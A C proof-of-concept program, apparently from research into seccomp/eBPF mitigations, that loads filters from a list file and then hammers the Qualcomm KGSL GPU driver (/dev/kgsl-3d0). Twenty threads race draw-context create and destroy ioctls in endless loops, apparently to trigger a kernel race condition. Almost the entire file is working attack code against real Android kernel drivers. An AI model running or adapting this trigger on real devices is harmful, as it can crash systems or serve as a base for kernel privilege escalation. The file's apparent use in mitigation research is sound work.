#include "kgsl.h"
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "libbpf.h"
#include "bpf_load.h"
#include <sys/prctl.h>
#include <linux/bpf.h>
#include <linux/seccomp.h>

#define SECCOMP_MODE_FILTER_EXTENDED 3

struct ebpf_filter {
    char path[256];
    int shared_map_ids[32];
};

int seccomp_set_filter(struct ebpf_filter *filter)
{
    if (load_bpf_file(filter->path, filter->shared_map_ids) != 0) {
        printf("Could not load seccomp/eBPF filter %s %s\n", filter->path, bpf_log_buf);
        return 1;
    }

    printf("filter %d %s fd: %d\n", prog_cnt, filter->path, prog_fd[prog_cnt-1]);

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER_EXTENDED, &(prog_fd[prog_cnt-1])) == -1) {
        printf("Could not install seccomp/eBPF filter, errno = %d\n", errno);
        return 1;
    }

    return 0;
}

int get_filter_list(struct ebpf_filter **filters) {
    FILE *fp;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    int i = 0;

    fp = fopen("/data/seccomp/kgsl_filter_list", "r");
    if (fp == NULL) {
        printf("get_filter_list failed to open\n");
        return 0;
    }

    while ((read = getline(&line, &len, fp)) != -1) {
        char *token;
        char *end;
        filters[i] = (struct ebpf_filter *)malloc(sizeof(struct ebpf_filter));
        for (int j = 0; j < 32; j++)
            filters[i]->shared_map_ids[j] = -1;

        token = strtok(line, " ");
        if (token != NULL) {
            strncpy(filters[i]->path, token, 256);
        }
        token = strtok(NULL, " ");
        if (token != NULL) {
            int maps_cnt = strtol(token, &end, 10);
            for (int j = 0; j < maps_cnt; j++) {
                token = strtok(NULL, " ");
                if (token != NULL) {
                    filters[i]->shared_map_ids[j] = strtol(token, &end, 10);
                }
            }
        }

        printf("get_filter_list %s\n", filters[i]->path);
        i++;
    }

    fclose(fp);
    if (line)
        free(line);
    return i;
}

struct thread_arg {
    int fd;
    struct kgsl_drawctxt_destroy *arg;
};

void *thread_func(void *vargp) {
    struct thread_arg *arg = (struct thread_arg *)vargp;
    while(1) {
        int ret = ioctl(arg->fd, IOCTL_KGSL_DRAWCTXT_DESTROY, arg->arg);
        printf("p2 destroy %d ret %d, errno %d\n", arg->arg->drawctxt_id, ret, errno);
    }
}

#define THREAD_NUM 2

void *timer_thread(void* vargp) {
    uint64_t *counter = (uint64_t *)vargp;
    clock_t begin = clock();
    while (1) {
        usleep(1000);
        uint64_t sum = 0;
        clock_t end = clock();
        double duration = (double)(end - begin) / CLOCKS_PER_SEC;
        for (int i = 0; i < THREAD_NUM; i++)
            sum += counter[i];
        printf("%f %lu\n", duration, sum);
    }

}

int main() {
    struct ebpf_filter *filters[32];
    int filters_cnt = get_filter_list(filters);
    for (int i = 0; i < filters_cnt; i++) {
        seccomp_set_filter(filters[i]);
    }

    int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    printf("open %d\n", kgsl_fd);
    if (kgsl_fd == -1) {
        err(1, "open");
    }

    int ret;
    struct kgsl_drawctxt_create create_arg = {
        .flags = KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_PREAMBLE,
//        .flags = 0x20088d3,//KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_PREAMBLE,
//        .flags = 0x88d3,//KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_PREAMBLE,
    };
    ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create_arg);
    printf("create %d ret %d\n", create_arg.drawctxt_id, ret);

    struct kgsl_drawctxt_destroy destroy_arg = {
        .drawctxt_id = create_arg.drawctxt_id,
    };
    ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy_arg);
    printf("destroy %d ret %d\n", destroy_arg.drawctxt_id, ret);

    uint64_t counter[THREAD_NUM] = {};
    pthread_t tid;
    pthread_create(&tid, NULL, timer_thread, (void *)counter);
    struct thread_arg arg;
    arg.fd = kgsl_fd;
    arg.arg = &destroy_arg;

    struct thread_arg args[20];
    struct kgsl_drawctxt_destroy destroy_args[20];
    for (int i = 0; i < 20; i++) {
        args[i].fd = kgsl_fd;
        args[i].arg = &destroy_args[i];
        destroy_args[i].drawctxt_id = i;
    }

    for (int i = 0; i < 20; i++) {
        pthread_create(&tid, NULL, thread_func, (void *)&args[i]);
    }

    while(1) {
        create_arg.flags = KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_PREAMBLE;
        ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create_arg);
        printf("create %d ret %d, errno %d\n", create_arg.drawctxt_id, ret, errno);
        destroy_arg.drawctxt_id = create_arg.drawctxt_id;
        ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy_arg);
        printf("p1 destroy %d ret %d, errno %d\n", destroy_arg.drawctxt_id, ret, errno);
        counter[0]++;
    }

    printf("finish\n");
    close(kgsl_fd);
    return 0;
}
